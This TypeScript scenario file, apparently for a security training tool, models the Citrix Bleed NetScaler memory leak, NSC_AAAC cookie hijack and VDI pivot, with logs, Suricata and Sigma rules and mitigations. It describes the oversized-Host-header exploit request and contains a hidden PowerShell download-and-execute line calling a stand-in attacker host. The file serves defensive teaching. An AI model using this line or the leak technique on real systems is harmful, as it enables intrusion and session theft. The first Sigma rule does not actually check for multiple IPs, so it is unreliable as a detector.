import type { AttackScenario } from '../types';

export const scenario: AttackScenario = {
  id: 'splunk-citrix-bleed-session-hijack',
  code: 'CVE-2023-4966',
  name: 'Splunk STRT, Mandiant & CISA — Citrix Bleed: NetScaler OOB Memory Leak & NSC_AAAC Hijack',
  shortSubtitle: 'Splunk STRT / Mandiant / CISA AA23-325A · CVE-2023-4966 Host Header Leak, NSC_AAAC Cookie & VDI Pivot',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 5,
  overview:
    'Documented by the Splunk Threat Research Team (STRT), Mandiant, and Joint CISA Advisory AA23-325A, Citrix Bleed (CVE-2023-4966) is an unauthenticated out-of-bounds memory read in Citrix NetScaler ADC and NetScaler Gateway. Sending an HTTP GET request to /oauth/idp/.well-known/openid-configuration with a 24,000+ byte Host header causes snprintf to return a length larger than the buffer, leaking adjacent process memory containing active 65-byte NSC_AAAC session tokens and bypassing MFA completely.',
  specs: [
    {
      term: 'PRIMARY SOURCE',
      value: 'Splunk Threat Research Team (STRT), Mandiant & CISA Advisory AA23-325A',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (CVE-2023-4966) · T1539 (Steal NSC_AAAC Cookie) · T1550.004 (Pass the Cookie)',
    },
    {
      term: 'VULNERABLE ENDPOINT',
      value: 'GET /oauth/idp/.well-known/openid-configuration (Oversized Host: Header)',
    },
    {
      term: 'LEAKED ARTIFACT',
      value: '65-Byte Hexadecimal NSC_AAAC Session Token in HTTP Response Body',
    },
  ],
  nodes: [
    {
      id: 'citrix_bleed_actor',
      label: 'Threat Actor (LockBit / UNC)',
      sublabel: '198.51.100.62 (Memory Bleed Scanner)',
      role: 'attacker',
      x: 15,
      y: 44,
      details: {
        osOrType: 'Ransomware / Espionage Intrusion Operator',
        pidOrPort: 'HTTPS :443 -> NetScaler OpenID Endpoint',
        privilege: 'Unauthenticated External',
        artifacts: [
          'GET /oauth/idp/.well-known/openid-configuration',
          'Host: AAAA... (24,576 Bytes) -> Regex [0-9a-f]{32,65}',
        ],
        description:
          'Attacker sending oversized Host headers to leak NetScaler nsppe packet-engine memory and extract active NSC_AAAC session cookies.',
      },
    },
    {
      id: 'netscaler_gateway',
      label: 'Citrix NetScaler ADC / Gateway',
      sublabel: '172.16.8.10 (nsppe Packet Engine)',
      role: 'victim_host',
      x: 44,
      y: 28,
      details: {
        osOrType: 'Citrix NetScaler ADC / Gateway Appliance (FreeBSD)',
        pidOrPort: 'Process: nsppe (NetScaler Packet Processing Engine)',
        privilege: 'Appliance Memory Space',
        artifacts: [
          'ns_aaa_oauthrp_send_openid_config() snprintf OOB Read',
          'Leaked Memory Buffer Containing Active NSC_AAAC Tokens',
        ],
        description:
          'Perimeter Citrix NetScaler Gateway whose OpenID configuration endpoint leaks adjacent heap/stack memory in the HTTP 200 response.',
      },
    },
    {
      id: 'nsc_aaac_session_replay',
      label: 'Hijacked NSC_AAAC Session',
      sublabel: 'Cookie: NSC_AAAC=4f8a91c2... (MFA Bypassed)',
      role: 'process',
      x: 54,
      y: 72,
      details: {
        osOrType: 'Replayed NetScaler AAA Session Cookie',
        pidOrPort: 'POST /logon/LogonPoint/Authentication/GetUserName',
        privilege: 'Authenticated Domain User / Admin',
        artifacts: [
          'Same NSC_AAAC Session Used from Two Distinct Client IPs',
          'Downloads launch.ica to Connect to Internal Citrix VDI',
        ],
        description:
          'Attacker replaying the leaked 65-byte NSC_AAAC cookie to impersonate an already-authenticated user without credentials or MFA.',
      },
    },
    {
      id: 'citrix_vdi_internal',
      label: 'Internal Citrix VDI & AD Host',
      sublabel: '10.10.25.40 (VDI-CORP-14)',
      role: 'server',
      x: 78,
      y: 30,
      details: {
        osOrType: 'Windows Server 2022 Citrix Virtual Desktop Host',
        pidOrPort: 'ICA / HDX Session -> powershell.exe & AnyDesk.exe',
        privilege: 'Internal Corporate Network',
        artifacts: [
          'Adfind.exe / net.exe Active Directory Recon',
          'SharpHound / RMM Deployment (CISA AA23-325A)',
        ],
        description:
          'Internal Citrix VDI desktop launched by the attacker using the hijacked NetScaler session to pivot into Active Directory.',
      },
    },
    {
      id: 'splunk_netscaler_siem',
      label: 'Splunk Enterprise Security (STRT)',
      sublabel: 'NetScaler ns.log & Suricata WAF',
      role: 'firewall_siem',
      x: 86,
      y: 68,
      details: {
        osOrType: 'Splunk SIEM & Suricata IDS',
        pidOrPort: 'NetScaler TCP/SSLVPN Logs & Sysmon',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'Alert: CVE-2023-4966 Oversized Host Header on openid-configuration',
          'Alert: Concurrent Multi-IP Usage of Single NetScaler Session',
        ],
        description:
          'Detects oversized responses from /.well-known/openid-configuration and session IP switching in NetScaler ns.log.',
      },
    },
  ],
  processTree: [
    {
      pid: 912,
      ppid: 1,
      name: 'nsppe (NetScaler Engine)',
      commandLine: '/netscaler/nsppe (Packet Processing Engine)',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: [
        'ns_aaa_oauthrp_send_openid_config()',
        'snprintf(buf, 0x20000, ...)',
        'ns_http_send_response(buf, return_len_oob)',
      ],
    },
    {
      pid: 5310,
      ppid: 4100,
      name: 'powershell.exe (VDI Session)',
      commandLine:
        'powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://198.51.100.62/recon.ps1\')"',
      user: 'CORP\\s.miller',
      integrity: 'Medium',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: ['WinHttpOpen', 'CreateProcessW("net.exe")'],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'NETSCALER SNPRINTF OOB MEMORY LEAK (CVE-2023-4966)',
      subtitle: 'Sending 24KB Host header to /oauth/idp/.well-known/openid-configuration',
      description:
        'Because ns_aaa_oauthrp_send_openid_config() inserts the HTTP Host header into a JSON template six times using snprintf without checking if the return value exceeds the 131,072-byte buffer size, a 24,576-byte Host header causes NetScaler to transmit ~16KB of adjacent process memory in the HTTP response.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['citrix_bleed_actor', 'netscaler_gateway', 'splunk_netscaler_siem'],
      compromisedNodeIds: ['netscaler_gateway'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2023-4966 (Citrix Bleed OOB Memory Read)' },
        { term: 'TARGET URI', value: 'GET /oauth/idp/.well-known/openid-configuration' },
        { term: 'ROOT CAUSE', value: 'Unbounded snprintf return value passed to HTTP response sender' },
      ],
    },
    {
      index: 2,
      title: 'NSC_AAAC SESSION COOKIE EXTRACTION & MFA BYPASS',
      subtitle: 'Carving 65-byte hex NSC_AAAC token from leaked memory and replaying',
      description:
        'As documented in CISA AA23-325A and Mandiant reports, the leaked memory dump contains plaintext NSC_AAAC session cookies belonging to active, MFA-authenticated VPN/Citrix users. The attacker validates the stolen cookie via /logon/LogonPoint/Authentication/GetUserName and hijacks the session.',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1539',
      mitreTechniqueName: 'Steal Web Session Cookie',
      activeNodeIds: ['citrix_bleed_actor', 'netscaler_gateway', 'nsc_aaac_session_replay', 'splunk_netscaler_siem'],
      compromisedNodeIds: ['netscaler_gateway', 'nsc_aaac_session_replay'],
      keySpecs: [
        { term: 'STOLEN COOKIE', value: 'NSC_AAAC=<65-byte hexadecimal session token>' },
        { term: 'VALIDATION URI', value: 'POST /logon/LogonPoint/Authentication/GetUserName' },
        { term: 'IMPACT', value: 'Complete MFA Bypass & Session Takeover (T1550.004)' },
      ],
    },
    {
      index: 3,
      title: 'CITRIX ICA VDI LAUNCH & INTERNAL AD RECONNAISSANCE',
      subtitle: 'Downloading launch.ica to pivot onto internal VDI workstation',
      description:
        'Using the hijacked NetScaler Gateway session, the attacker requests an ICA connection file (launch.ica), opens an interactive virtual desktop session on VDI-CORP-14 inside the corporate network, and executes PowerShell discovery and RMM tools.',
      mitreTacticPhase: 6,
      mitreTechniqueId: 'T1550.004',
      mitreTechniqueName: 'Use Alternate Authentication Material: Web Session Cookie',
      activeNodeIds: ['nsc_aaac_session_replay', 'citrix_vdi_internal', 'splunk_netscaler_siem'],
      compromisedNodeIds: ['netscaler_gateway', 'nsc_aaac_session_replay', 'citrix_vdi_internal'],
      keySpecs: [
        { term: 'PIVOT MECHANISM', value: 'Citrix StoreFront / Gateway ICA Virtual Desktop Launch' },
        { term: 'NS.LOG ANOMALY', value: 'SSLVPN TCPCONNSTAT showing 2 client IPs for 1 username/session' },
        { term: 'CISA ADVISORY', value: 'AA23-325A (Citrix Bleed Exploitation by LockBit 3.0)' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'spl-cb-1',
      no: 1,
      stageIndex: 1,
      timestamp: '15:02:11.045',
      sourceNodeId: 'citrix_bleed_actor',
      targetNodeId: 'netscaler_gateway',
      sourceLabel: '198.51.100.62',
      targetLabel: 'NetScaler :443',
      sourceType: 'IDS_ALERT',
      protocolOrEventId: 'Suricata CVE-2023-4966',
      shortAction: 'CITRIX BLEED GET',
      info: 'GET /oauth/idp/.well-known/openid-configuration with 24,576-Byte Host Header -> HTTP 200 (148,120 Bytes)',
      sizeOrCode: '148 KB Leak',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'A normal response from /.well-known/openid-configuration is ~1.5 KB. A response exceeding 131 KB confirms active CVE-2023-4966 memory bleed.',
      rawLog: `GET /oauth/idp/.well-known/openid-configuration HTTP/1.1
Host: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [24576 bytes]
User-Agent: curl/8.1.2

HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 148120
{"issuer": "https://AAA...", ...}\\x00\\x00\\x18\\x00NSC_AAAC=4f8a91c2e7b031948271635481920384756192038475619203847561920384756\\x00`,
      detectionRule: {
        type: 'SURICATA',
        title: 'Splunk STRT / CISA — Citrix Bleed CVE-2023-4966 Memory Leak Response',
        ruleCode: `alert http any any -> $HOME_NET any (msg:"CISA AA23-325A Citrix Bleed CVE-2023-4966 Oversized Host Header"; flow:established,to_server; http.uri; content:"/oauth/idp/.well-known/openid-configuration"; http.host; bsize:>4096; classtype:attempted-recon; sid:20234966; rev:1;)`,
        mitigation:
          'Patch Citrix NetScaler ADC/Gateway AND run "kill icaconnection -all" and "kill rdp connection -all" followed by "clear ns partition" to invalidate leaked NSC_AAAC tokens.',
      },
    },
    {
      id: 'spl-cb-2',
      no: 2,
      stageIndex: 2,
      timestamp: '15:02:19.410',
      sourceNodeId: 'nsc_aaac_session_replay',
      targetNodeId: 'netscaler_gateway',
      sourceLabel: '198.51.100.62 (Attacker)',
      targetLabel: 'NetScaler ns.log',
      sourceType: 'NETWORK',
      protocolOrEventId: 'NetScaler SSLVPN Log',
      shortAction: 'REPLAY NSC_AAAC',
      info: 'Cookie: NSC_AAAC=4f8a91c2... User=s.miller Client_ip=198.51.100.62 (Original Login IP=73.15.20.8)',
      sizeOrCode: 'IP Mismatch',
      severity: 'CRITICAL',
      mitreId: 'T1539',
      explanation:
        'NetScaler /var/log/ns.log shows an active SSLVPN session for user s.miller suddenly issuing requests from a second external IP address (198.51.100.62).',
      rawLog: `Nov 13 15:02:19 <local0.info> 172.16.8.10 11/13/2024:15:02:19 GMT ns-gw-01 0-PPE-0 : default SSLVPN TCPCONNSTAT 88120 0 : Context s.miller@73.15.20.8 - SessionId: 412 - User s.miller - Client_ip 198.51.100.62 - Nat_ip 172.16.8.11 - Dest_ip 10.10.25.40:2598`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Citrix NetScaler Session Hijack (Multiple Client IPs per SessionId)',
        ruleCode: `title: Citrix NetScaler SSLVPN Session Used From Multiple Client IPs
logsource:
  product: citrix
  service: netscaler
detection:
  selection:
    EventType: 'TCPCONNSTAT'
  condition: selection
level: critical`,
        mitigation:
          'Correlate NetScaler SessionId values in /var/log/ns.log and terminate any session where Client_ip differs from the initial authentication Context IP.',
      },
    },
    {
      id: 'spl-cb-3',
      no: 3,
      stageIndex: 3,
      timestamp: '15:04:02.915',
      sourceNodeId: 'nsc_aaac_session_replay',
      targetNodeId: 'citrix_vdi_internal',
      sourceLabel: 's.miller (Hijacked ICA)',
      targetLabel: 'VDI-CORP-14 (PID 5310)',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 1',
      shortAction: 'VDI POWERSHELL RECON',
      info: 'ParentImage=wfshell.exe Image=powershell.exe CommandLine="powershell -nop -w hidden IEX..."',
      sizeOrCode: 'PID 5310',
      severity: 'HIGH',
      mitreId: 'T1550.004',
      explanation:
        'Inside the Citrix VDI host, wfshell.exe (Citrix UserInit Shell) spawns hidden PowerShell to download post-exploitation reconnaissance tools.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>1</EventID>
    <Computer>VDI-CORP-14.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="ProcessId">5310</Data>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.62/recon.ps1')"</Data>
    <Data Name="ParentImage">C:\\Program Files (x86)\\Citrix\\System32\\wfshell.exe</Data>
    <Data Name="User">CORP\\s.miller</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Citrix VDI Shell (wfshell.exe) Spawning Hidden PowerShell or Recon Tools',
        ruleCode: `title: Suspicious Child Process of Citrix wfshell.exe
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\\wfshell.exe'
    Image|endswith:
      - '\\powershell.exe'
      - '\\cmd.exe'
      - '\\net.exe'
      - '\\AnyDesk.exe'
  condition: selection
level: high`,
        mitigation:
          'Enforce PowerShell Constrained Language Mode and AppLocker policies on Citrix VDI images.',
      },
    },
  ],
};
